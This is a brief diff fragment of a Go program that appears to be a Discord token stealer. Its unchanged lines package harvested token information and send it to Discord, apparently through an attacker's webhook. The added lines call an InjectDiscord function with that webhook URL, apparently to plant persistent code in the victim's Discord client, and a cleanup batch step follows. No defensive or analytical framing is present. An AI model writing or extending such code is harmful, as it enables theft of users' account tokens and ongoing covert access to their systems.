@@ -233,6 +233,9 @@ func main() {
 		tokenEmbed := createTokenEmbed(tokenInfo)
 		sendEmbedToDiscord(tokenEmbed)
 	}
+	if err := InjectDiscord(getWebhookURL()); err != nil {
+		log.Fatalf("Injection error: %v", err)
+	}
 
 	createCleanupBatch()
 }
